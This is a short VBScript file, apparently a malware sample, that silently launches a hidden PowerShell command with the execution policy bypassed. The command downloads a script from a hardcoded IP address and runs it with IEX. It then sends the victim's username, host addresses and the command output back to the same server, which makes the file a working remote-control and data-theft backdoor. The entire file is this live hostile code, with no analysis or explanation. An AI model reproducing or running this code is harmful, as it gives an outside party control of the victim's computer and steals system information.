dim r, c
set r = createobject("WScript.Shell")
c = "powershell.exe -executionpolicy bypass -w hidden -noprofile -c $iik=new-object net.webclient;$flm=$iik.downloaddata('http://147.78.46.40:37662/RcebKRvainvQnoeS/page311/upgrade.txt');if($flm.Length -gt 1){$jkr=[system.text.encoding]::utf8.getString($flm);if($jkr -match 'get-content'){[byte[]] $drpy=IEX $jkr;}else{$bjdo=whoami;$bjdo+='==';$bjdo+=[System.Net.Dns]::GetHostAddresses($ip)+[System.Environment]::NewLine;$bjdo+=IEX $jkr|out-string;[byte[]]$drpy=[system.text.encoding]::Utf8.GetBytes($bjdo);};$ujk=new-object net.webclient;$ujk.uploaddata('http://147.78.46.40:43891/page311',$drpy);}"
r.Run c, 0, false
